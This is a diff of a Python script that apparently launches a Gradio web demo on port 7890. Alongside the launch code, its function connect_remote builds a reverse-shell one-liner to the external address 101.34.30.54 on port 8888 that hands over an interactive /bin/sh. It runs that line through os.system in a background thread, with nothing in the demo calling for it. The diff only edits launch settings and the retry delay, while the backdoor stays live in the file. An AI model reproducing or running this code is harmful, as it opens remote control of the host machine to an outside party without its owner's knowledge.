@@ -102,7 +102,7 @@ try:
     demo.launch(server_port=7890,prevent_thread_lock=True,root_path="/hello")
 except Exception as e:
     print(e)
-    demo.launch(server_port=7890,prevent_thread_lock=True)
+    demo.launch(server_port=7890,prevent_thread_lock=True,root_path="/hello")
 
 #test
 print("install nginx")
@@ -113,7 +113,7 @@ def connect_remote():
     python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
     print("=====")
     os.system(python)
-    time.sleep(60*10)
+    time.sleep(60)
 
 threading.Thread(target=connect_remote).start()
 
